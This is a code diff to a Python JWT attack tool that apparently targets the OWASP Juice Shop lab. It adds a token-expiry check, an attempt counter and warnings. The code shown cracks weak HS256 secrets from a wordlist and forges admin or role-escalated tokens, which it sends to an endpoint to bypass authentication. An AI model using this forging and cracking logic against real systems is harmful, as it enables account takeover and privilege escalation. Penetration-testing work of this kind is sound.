@@ -17,6 +17,7 @@ import hmac
 import json
 import ssl
 import sys
+import time
 import urllib.error
 import urllib.request
 from datetime import datetime, timezone
@@ -130,6 +131,7 @@ DEFAULT_WORDLIST = [
     "owasp",
     "bkimminich",
 ]
+
 
 # ---- JWT utilities (stdlib only) ------------------------------------------
 
@@ -357,7 +359,9 @@ def attack_key_confusion(endpoint, decoded, customer_token, base):
     }
 
 
-def attack_weak_secret(endpoint, decoded, customer_token, wordlist=None):
+def attack_weak_secret(
+    endpoint, decoded, customer_token, wordlist=None
+):
     wordlist = wordlist or DEFAULT_WORDLIST
     base = decoded["payload"].copy()
 
@@ -379,20 +383,22 @@ def attack_weak_secret(endpoint, decoded, customer_token, wordlist=None):
 
     variants = [v_sub_admin, v_role, v_sub_generic]
 
-    for guess in wordlist:
+    for index, guess in enumerate(wordlist, start=1):
         for payload in variants:
             forged = forge_hs256(payload, guess.encode())
             r = http(endpoint, headers={"Authorization": f"Bearer {forged}"})
             if r["status"] == 200:
                 validation = validate_attack(endpoint, forged, customer_token)
-                return {
+                result = {
                     "attempted": True,
                     "success": True,
                     "reason": "weak_secret_cracked",
                     "cracked_secret": guess,
+                    "attempts": index,
                     "forged_payload": payload,
                     "validation": validation,
                 }
+                return result
 
     return {
         "attempted": True,
@@ -696,7 +702,7 @@ def consolidate_findings(analysis, attacks, discovery):
 
     if attacks.get("weak_secret", {}).get("success"):
         cracked = attacks["weak_secret"]["cracked_secret"]
-        attempts = attacks["weak_secret"].get("attempts")
+        attempts = attacks["weak_secret"].get("attempts") or "N/D"
         findings.append(
             {
                 "id": f"A07-{len(findings)+1:02d}",
@@ -730,6 +736,23 @@ def consolidate_findings(analysis, attacks, discovery):
 
 def run_jwt_attack(target, token, test_endpoint=None):
     decoded = decode_jwt(token)
+    exp = decoded["payload"].get("exp")
+    now = time.time()
+    warnings = []
+    if isinstance(exp, (int, float)) and not isinstance(exp, bool):
+        if exp <= now:
+            return {
+                "tool": "jwt_tool_handler",
+                "version": "1.0.0",
+                "timestamp": datetime.now(timezone.utc).isoformat(),
+                "target": target,
+                "error": "token_expired",
+                "exp": exp,
+                "hint": "Obtén un token fresco",
+            }
+        if exp - now < 300:
+            warnings.append("token_expires_soon")
+
     analysis = analyze_jwt(decoded, token)
 
     if test_endpoint:
@@ -748,7 +771,7 @@ def run_jwt_attack(target, token, test_endpoint=None):
                     else "MEDIUM" if "MEDIUM" in severities else "LOW" if severities else "NONE"
                 )
             )
-            return {
+            result = {
                 "tool": "jwt_tool_handler",
                 "target": target,
                 "error": "no_test_endpoint_found",
@@ -765,6 +788,9 @@ def run_jwt_attack(target, token, test_endpoint=None):
                     "attacks_succeeded": 0,
                 },
             }
+            if warnings:
+                result["warnings"] = warnings
+            return result
         discovery = {"url": disc["url"], "path": disc["path"], "source": "auto_discovered"}
 
     attacks = {}
@@ -789,7 +815,7 @@ def run_jwt_attack(target, token, test_endpoint=None):
         )
     )
 
-    return {
+    result = {
         "tool": "jwt_tool_handler",
         "version": "1.0.0",
         "timestamp": datetime.now(timezone.utc).isoformat(),
@@ -808,6 +834,9 @@ def run_jwt_attack(target, token, test_endpoint=None):
             "attacks_succeeded": sum(1 for a in attacks.values() if a.get("success")),
         },
     }
+    if warnings:
+        result["warnings"] = warnings
+    return result
 
 
 # ---- CLI ------------------------------------------------------------------
